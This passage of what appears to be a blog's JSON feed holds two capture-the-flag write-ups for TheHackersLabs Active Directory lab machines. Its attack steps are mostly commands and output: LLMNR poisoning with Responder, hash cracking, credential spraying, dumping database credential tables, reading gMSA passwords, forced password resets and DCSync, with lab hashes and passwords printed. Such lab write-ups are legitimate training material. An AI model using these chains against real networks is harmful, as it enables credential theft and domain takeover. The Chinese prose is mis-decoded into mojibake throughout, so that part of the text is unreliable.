cons.thl -u anonymous -p ''                                                             \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [-] cons.thl\\anonymous: STATUS_LOGON_FAILURE \n```\n\nå†çœ‹ä¸€çœ¼ `wireshark` ï¼Œä¾æ—§æœ‰ `LLMNR`åŒ…ï¼Œå¹¶ä¸”ä»æ•°æ®åŒ…å¯ä»¥çœ‹å‡ºæ¥æ˜¯åœ¨æŸ¥è¯¢ `SQLserver`\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image1.png)\n\n### Responder\n\næˆ‘ä»¬å¼€å¯ `Responder` ä¸ä¸€ä¼šå°±å°±èƒ½æŠ“åˆ° `HASH`\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image2.png)\n\nå¼€å±€çš„æ€è·¯å’Œ`Curiosity`å·®ä¸å¤š\n\næˆ‘ä»¬å°è¯•å°†`HASH`è¿›è¡Œçˆ†ç ´\n\n```bash\nhashcat -m 5600 hash /usr/share/seclists/Passwords/seasons.txt\n```\n\nå¾—åˆ°å¯†ç `au7umn@`\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image3.png)\n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ  Curiosity2 nxc smb cons.thl -u sqldb -p 'au7umn@'\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ \n\nâœ  Curiosity2 nxc ldap cons.thl -u sqldb -p 'au7umn@'\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ \n\nâœ  Curiosity2 nxc winrm cons.thl -u sqldb -p 'au7umn@'\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ (Pwn3d!)\n```\n\n## è„±åº“\n\næ ¹æ®ç”¨æˆ·åï¼Œè¯¥ç”¨æˆ·åº”è¯¥æ˜¯å¯¹æ•°æ®åº“æœ‰ä¸€å®šæƒé™\n\n```bash\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"SELECT @@VERSION\"\n\n------------------------------------------------------------------------------\nMicrosoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\n        Sep 24 2019 13:48:23\n        Copyright (C) 2019 Microsoft Corporation\n        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"SELECT name FROM sys.databases\"\nname\n--------------------------------------------------------------------------------------------------------------------------------\nmaster\ntempdb\nmodel\nmsdb\nCredentialsDB\ntoolsdb\n\n(6 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE CredentialsDB;SELECT name FROM sys.tables\"\nChanged database context to 'CredentialsDB'.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nCredentials\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE CredentialsDB;SELECT * FROM Credentials\"\nChanged database context to 'CredentialsDB'.\nID          Username                                           Password\n----------- -------------------------------------------------- -------------------------------------------------------------\n          1 sqlsvc                                             a6d888301de7aa3b380a691d32837627\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE toolsdb;SELECT name FROM sys.tables\"\nMsg 916, Level 14, State 2, Server WIN-C73PROQLRHL\\SQLEXPRESS, Line 1\nThe server principal \"CONS\\sqldb\" is not able to access the database \"toolsdb\" under the current security context.\n```\n\næ‹¿åˆ° `sqlsvc` çš„å¯†ç `MD5`å€¼ï¼Œæ‹¿å»ç ´è§£ï¼Œè¿˜å¯ä»¥å‘ç°\n\nå¾—åˆ°å¯†ç  `$PRING2021#`\n\n```bash\nâœ  Curiosity2 john --wordlist=/usr/share/seclists/Passwords/seasons.txt --format=Raw-MD5 hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\n$PRING2021#      (?)     \n1g 0:00:00:00 DONE (2025-07-19 20:11) 50.00g/s 19200p/s 19200c/s 19200C/s $pr1ng..$umm3r2021%\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed.\n```\n\næµ‹è¯•`sqlsvc`çš„å‡­æ®\n\n```bash\nâœ  Curiosity2 nxc winrm cons.thl -u sqlsvc -p '$PRING2021#'\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:$PRING2021# (Pwn3d!)\nâœ  Curiosity2 nxc ldap cons.thl -u sqlsvc -p '$PRING2021#'\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:$PRING2021# \nâœ  Curiosity2 nxc smb cons.thl -u sqlsvc -p '$PRING2021#'\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:$PRING2021#\n```\n\n## KeePass - 1\n\nä½¿ç”¨`WinRM`ç™»é™†ä¸Šå»åï¼Œç›®å½•ä¸­æœ‰ä¸€ä¸ª`Database.kdbx`\n\næ˜¯`KeePass`çš„æ–‡ä»¶\n\n```bash\n*Evil-WinRM* PS C:\\Users\\sqlsvc\\Documents> ls\n\n    Directory: C:\\Users\\sqlsvc\\Documents\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       10/31/2024   6:23 PM           2231 Database.kdbx\n```\n\næˆ‘ä»¬å°è¯•ä¸€ä¸‹ä½¿ç”¨`KeePass` æ¥æ‰“å¼€ï¼Œéœ€è¦å¯†ç \n\n![image.png](/post-images/TheHackersLabsCuriosity2/image4.png)\n\næ²¡æœ‰å¯†ç ï¼Œå…ˆæ”¾ç€\n\n## æ¨ªå‘ç§»åŠ¨\n\n### åŸŸåˆ†æ\n\nä¸Š `BloodHound`\n\nç”¨æˆ·å¾ˆå¤šï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥ç­›é€‰äº†è¿œç¨‹ç®¡ç†ç»„ï¼ˆREMOTE MANAGMENT USï¼‰çš„ç”¨æˆ·\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image5.png)\n\nèƒ½å‘ç° `SQLSVC` èƒ½ç›´æ¥ä¿®æ”¹ `GMSA_SQL`çš„å¯†ç \n\n![image.png](/post-images/TheHackersLabsCuriosity2/image6.png)\n\nç„¶å `GMSA_SQL` è¿˜å¯ä»¥ä¿®æ”¹ `TOOLSDB` ï¼ˆä¸Šè¾¹æœ‰ä¸€ä¸ªåŒåæ•°æ®åº“ï¼Œæˆ‘ä»¬æ— æƒé™è®¿é—®ï¼‰çš„å¯†ç \n\næ€»ç»“èµ·æ¥å°±æ˜¯\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image7.png)\n\n### To Toolsdb\n\né¦–å…ˆè¯»å– `gMSA`çš„å¯†ç \n\n```bash\nâœ  gMSADumper python gMSADumper.py -u sqlsvc -p '$PRING2021#' -d cons.thl  \nUsers or groups who can read password for GMSA_SQL$:\n > Svc_Accounts\nGMSA_SQL$:::0960ee1575670e65d189eb6e685713ca\nGMSA_SQL$:aes256-cts-hmac-sha1-96:ba95bac751b094ed71a42fcb7c4c1b34c5bdea75e47054744fa5b11863be0ea0\nGMSA_SQL$:aes128-cts-hmac-sha1-96:e74d4f008426bf3fe930d12485d3f212\n```\n\nå†é€šè¿‡ `GMSA_SQL` ä¿®æ”¹ `TOOLSDB` çš„å¯†ç \n\n```bash\nâœ  Curiosity2 bloodyAD -d 'cons.thl' -u 'GMSA_SQL$' -p :0960ee1575670e65d189eb6e685713ca --dc-ip 192.168.56.116 set password 'TOOLSDB' 'Password@123'\n[+] Password changed successfully!\n```\n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ  Curiosity2 nxc smb cons.thl -u TOOLSDB -p 'Password@123'\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\TOOLSDB:Password@123 \n```\n\n### To Msol & KeePass - 2\n\næˆ‘ä»¬ç™»é™†ä¸Š`toolsdb` ï¼Œå¹¶ç”¨æ•°æ®åº“è„± `toolsdb` çš„æ•°æ®\n\n```bash\n*Evil-WinRM* PS C:\\Users\\toolsdb\\Desktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE toolsdb;select name from sys.tables\"\nChanged database context to 'toolsdb'.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nusers\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\toolsdb\\Desktop> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE toolsdb;select * from users\"\nChanged database context to 'toolsdb'.\nid          username                                           password\n----------- -------------------------------------------------- --------------------------------------------------\n          1 user_6B482050                                      433129A1!@1\n          2 user_47F7501A                                      64409A1C!@1\n          3 user_515A0C58                                      CAD616E3!@1\n          4 user_CA843BF2                                      731C60AD!@1\n          5 user_AA2B9FF8                                      8E181E5F!@1\n          6 user_F6E6A108                                      47862562!@1\n          7 user_8D56BAE8                                      425B6335!@1\n          8 user_BA9B1295                                      E4FC1AC4!@1\n          9 user_66B7DBEE                                      4EE216A3!@1\n         10 user_E75B7C23                                      4CD89A92!@1\n\n(10 rows affected)\n```\n\nç»™äº†ä¸€ç»„å¯†ç ï¼Œæ„Ÿè§‰æ˜¯ `KeePass` æ–‡ä»¶çš„å¯†ç \n\n```bash\n433129A1!@1\n64409A1C!@1\nCAD616E3!@1\n731C60AD!@1\n8E181E5F!@1\n47862562!@1\n425B6335!@1\nE4FC1AC4!@1\n4EE216A3!@1\n4CD89A92!@1\n```\n\næœ€åä½¿ç”¨`8E181E5F!@1`æˆåŠŸè§£å¯†\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image8.png)\n\nå¾—åˆ°ç”¨æˆ· `MSOL` ç”¨æˆ·å¯†ç  `YRax2Ry8g2ITQ3hpRPze`\n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ  Curiosity2 nxc smb cons.thl -u MSOL -p 'YRax2Ry8g2ITQ3hpRPze'\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\MSOL:YRax2Ry8g2ITQ3hpRPze \n```\n\n### To Administrator\n\næŸ¥çœ‹æƒé™ï¼Œoiiaioiiiai\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image9.png)\n\næˆ‘ä»¬å¯¹åŸŸæœ‰`GetChangeAll`\n\nç›´æ¥`Dump`\n\n![image.png](/post-images/TheHackersLabsCuriosity2/image10.png)\n\nè¯»å– `user.txt` å’Œ `root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\appolonia\\Documents> cat User.flag.txt\nde4xxxxxxxxxxxxxxxxxxxx\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat root.flag.txt\n372xxxxxxxxxxxxxxxxxxxx\n```\n\n## æ€»ç»“\n\næ²¡æœ‰å¡ç‚¹ï¼Œé…£ç•…æ·‹æ¼“ï¼Œä¸€æŠŠæ¢­å“ˆ\n\nç°åœ¨å°±`Curiosity3`æŠŠæˆ‘å¡ä½äº†",
            "url": "https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity2",
            "title": "TheHackersLabs - Curiosity2",
            "summary": "Curiosity2 https://labs.thehackerslabs.com/machine/103 Recon PortScan nmap ç«¯å£æ‰«æ æšä¸¾æµ‹è¯• æµ‹è¯• SMB åŒ¿åè´¦æˆ· å†çœ‹ä¸€çœ¼ wireshark ï¼Œä¾æ—§æœ‰ LLMNRåŒ…ï¼Œå¹¶ä¸”ä»æ•°æ®åŒ…å¯ä»¥çœ‹å‡ºæ¥æ˜¯åœ¨æŸ¥è¯¢ SQLserver ...",
            "date_modified": "2025-07-19T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "AD",
                "Responder",
                "MSSQL",
                "gMSA",
                "KeePass"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity",
            "content_html": "\n# Curiosity\n\n> https://labs.thehackerslabs.com/machine/23\n> \n\n![image.png](/post-images/TheHackersLabsCuriosity/image.png)\n\n## Recon\n\n### PortScan\n\n`nmap` ç«¯å£æ‰«æ\n\n```bash\nâœ  Curiosity nmap -sT -min-rate 10000 -p- 192.168.56.8\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:28 CST\nWarning: 192.168.56.8 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.56.8\nHost is up (0.00052s latency).\nNot shown: 64857 closed tcp ports (conn-refused), 653 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49672/tcp open  unknown\n49683/tcp open  unknown\n49695/tcp open  unknown\n49703/tcp open  unknown\n49704/tcp open  unknown\nMAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n`UDP` ä¹Ÿæ‰«æ\n\n```bash\nâœ  Curiosity nmap -sU -min-rate 10000 -p- 192.168.56.8                                                                                                                                    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:35 CST\nWarning: 192.168.56.8 giving up on port because retransmission cap hit (10).\nNmap scan report for hackme.thl (192.168.56.8)\nHost is up (0.032s latency).\nNot shown: 65449 open|filtered udp ports (no-response), 81 closed udp ports (port-unreach)\nPORT    STATE SERVICE\n53/udp  open  domain\n88/udp  open  kerberos-sec\n123/udp open  ntp\n137/udp open  netbios-ns\n389/udp open  ldap\nMAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```bash\nâœ  Curiosity nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.8\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:29 CST\nNmap scan report for 192.168.56.8\nHost is up (0.00050s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 05:30:19Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49670/tcp open  msrpc         Microsoft Windows RPC\n49672/tcp open  msrpc         Microsoft Windows RPC\n49683/tcp open  msrpc         Microsoft Windows RPC\n49695/tcp open  msrpc         Microsoft Windows RPC\n49703/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-07-19T05:31:14\n|_  start_date: 2025-07-19T11:20:37\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:94:ab:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.50 ms 192.168.56.8\n```\n\n### æšä¸¾æµ‹è¯•\n\nå› ä¸ºæ²¡æœ‰ `Web` ç«¯å£ï¼Œæˆ‘ä»¬ä»  `SMB` æœåŠ¡å¼€å§‹æšä¸¾\n\næµ‹è¯•åŒ¿åè´¦æˆ·\n\n```bash\nâœ  Curiosity smbclient -L 192.168.56.8 -U anonymous\nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n```\n\nåœ¨è¿™é‡Œå°è¯•æšä¸¾äº†å¾ˆä¹…ï¼Œæ²¡ç»“æœ\n\n### responder\n\næ‰“å¼€ `Wireshark` æŠ“åŒ…çœ‹çœ‹\n\nçœ‹åˆ°`LLMNR`ï¼Œè®©æˆ‘æƒ³èµ·äº†`NTLM`ä¸­ç»§æ”»å‡»\n\n![image.png](/post-images/TheHackersLabsCuriosity/image1.png)\n\næ‰“å¼€ `responder` \n\n```bash\nresponder -I eth2\n```\n\næŠ“åˆ° `jdoe` çš„ `NET-NTLM hash`\n\n![image.png](/post-images/TheHackersLabsCuriosity/image2.png)\n\nä½¿ç”¨ `hashcat` è¿›è¡Œçˆ†ç ´\n\n```bash\nhashcat -m 5600 hash /usr/share/seclists/Passwords/seasons.txt \n```\n\nå¾—åˆ°å¯†ç `$pr1ng@`\n\n![image.png](/post-images/TheHackersLabsCuriosity/image3.png)\n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ  Curiosity nxc smb hackme.thl -u jdoe -p '$pr1ng@'                                                         \nSMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.8    445    DC               [+] hackme.thl\\jdoe:$pr1ng@ \nâœ  Curiosity nxc ldap hackme.thl -u jdoe -p '$pr1ng@'\nLDAP        192.168.56.8    389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)\nLDAP        192.168.56.8    389    DC               [+] hackme.thl\\jdoe:$pr1ng@ \nâœ  Curiosity nxc winrm hackme.thl -u jdoe -p '$pr1ng@'\nWINRM       192.168.56.8    5985   DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.8    5985   DC               [+] hackme.thl\\jdoe:$pr1ng@ (Pwn3d!)\n```\n\nå½“å‰ç”¨æˆ·å¯ä»¥æ‹¿åˆ° `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\jdoe\\Desktop> cat user.txt\n{bdxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## åŸŸåˆ†æ\n\næ”¶é›†æ•°æ®\n\n```bash\nâœ  Curiosity bloodhound-python -d 'hackme.thl' -ns 192.168.56.8 --zip -c All -dc 'DC.hackme.thl' -u jdoe -p '$pr1ng@'\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: hackme.thl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC.hackme.thl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC.hackme.thl\nINFO: Found 17 users\nINFO: Found 67 groups\nINFO: Found 2 gpos\nINFO: Found 6 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC.hackme.thl\nINFO: Connecting to GC LDAP server: DC.hackme.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250719140452_bloodhound.zip\n```\n\nä¸Š `BLoodhound`\n\nç”¨æˆ·ç»„ä¿¡æ¯\n\n![image.png](/post-images/TheHackersLabsCuriosity/image4.png)\n\n`jdoe` ç”¨æˆ·ä¿¡æ¯\n\n![image.png](/post-images/TheHackersLabsCuriosity/image5.png)\n\næ‹¥æœ‰å¼ºåˆ¶ä¿®æ”¹`DBA_ADM` çš„æƒé™\n\n![image.png](/post-images/TheHackersLabsCuriosity/image6.png)\n\n## æ¨ªå‘ç§»åŠ¨\n\n### To DBA_ADM\n\né€šè¿‡ `bloodyAD` æ¥ä¿®æ”¹å…¶å¯†ç ï¼Œå¤±è´¥äº† âŒ\n\n![image.png](/post-images/TheHackersLabsCuriosity/image7.png)\n\næˆ‘ä»¬è¿œç¨‹ä¸Šå»é€šè¿‡ `PowerShell` æ”¹ \n\n```bash\n$SecPassword = ConvertTo-SecureString '$pr1ng@' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('HACKME\\jdoe', $SecPassword)\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n. ./PowerView.ps1\nSet-DomainUserPassword -Identity DBA_ADM -AccountPassword $UserPassword -Credential $Cred\n```\n\næµ‹è¯•å‡­æ®\n\n![image.png](/post-images/TheHackersLabsCuriosity/image8.png)\n\n### To sqlsvc\n\n![image.png](/post-images/TheHackersLabsCuriosity/image9.png)\n\n```bash\n*Evil-WinRM* PS C:\\Users> ls\n\n    Directory: C:\\Users\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       10/18/2024   8:34 AM                Administrator\nd-----       10/17/2024   4:53 PM                dba_adm\nd-----       10/17/2024   2:56 PM                jdoe\nd-----       10/17/2024   7:49 PM                MSSQL$SQLEXPRESS\nd-r---        9/12/2016   1:37 PM                Public\nd-----       10/18/2024   5:46 PM                sqlsvc\nd-----       10/17/2024   7:49 PM                SQLTELEMETRY$SQLEXPRESS\n```\n\n`winpeas` æšä¸¾æ—¶èƒ½çœ‹åˆ°æ•°æ®åº“çš„ç®¡é“\n\n![image.png](/post-images/TheHackersLabsCuriosity/image10.png)\n\næˆ‘ä»¬çš„ç”¨æˆ·åº”è¯¥æ˜¯å¯ä»¥å’Œæ•°æ®åº“è¿›è¡Œäº¤äº’çš„\n\n```bash\n*Evil-WinRM* PS C:\\> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"SELECT @@VERSION\"\n\n--------------------------------------------------------------\nMicrosoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\n        Sep 24 2019 13:48:23\n        Copyright (C) 2019 Microsoft Corporation\n        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)\n\n(1 rows affected)\n```\n\n```bash\n*Evil-WinRM* PS C:\\> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"select name FROM sys.databases\"\nname\n-------------------------------------------------------------------------------------------\ntempdb\nmodel\nmsdb\nCredentialsDB\n\n(5 rows affected)\n```\n\n```bash\n*Evil-WinRM* PS C:\\> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE CredentialsDB;select name from  sys.tables\"\nChanged database context to 'CredentialsDB'.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nCredentials\n\n(1 rows affected)\n```\n\n```bash\n*Evil-WinRM* PS C:\\> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE CredentialsDB;select * from Credentials\"\nChanged database context to 'CredentialsDB'.\nID          Username                                           Password\n----------- -------------------------------------------------- ---------------------------------------------\n          1 sqlsvc                                             23012244084524e51305f015727b890b\n\n(1 rows affected)\n```\n\nè¿™æ ·å°±è¯»åˆ°äº†`sqlsvc`ç”¨æˆ·çš„å¯†ç \n\nåˆ°åœ¨çº¿ç½‘ç«™è¿›è¡Œç ´è§£ï¼Œå¾—åˆ°å¯†ç  `P@ssword1234!`\n\n![image.png](/post-images/TheHackersLabsCuriosity/image11.png)\n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ  Curiosity nxc smb hackme.thl -u sqlsvc -p 'P@ssword1234!'\nSMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.8    445    DC               [+] hackme.thl\\sqlsvc:P@ssword1234! \n```\n\n### To GMSA_SVC$\n\n`SQLSVC` è´¦æˆ·å¯ä»¥è¯»å– `GMAS` å¯†ç \n\n![image.png](/post-images/TheHackersLabsCuriosity/image12.png)\n\nè¯»å– `gMSA` çš„å¯†ç \n\n```bash\nâœ  gMSADumper python gMSADumper.py -u sqlsvc -p 'P@ssword1234!' -d hackme.thl\nUsers or groups who can read password for GMSA_SVC$:\n > GMSA_USERS\nGMSA_SVC$:::e1eef5023c307890fdbb047e6554cfd0\nGMSA_SVC$:aes256-cts-hmac-sha1-96:b6ec5a8b9a8b6053167b86b1ef724f3af27c3de4286a59a6bfcb293a37740b66\nGMSA_SVC$:aes128-cts-hmac-sha1-96:a6dc7233da4a2d54e340bb0131d9d921\n```\n\n### To Administrator\n\næˆ‘ä»¬å¯»æ‰¾è·¯å¾„ï¼Œå‘ç°`GMSA_SVC$` å¯¹ `DC` æœ‰ `AllowToAct` 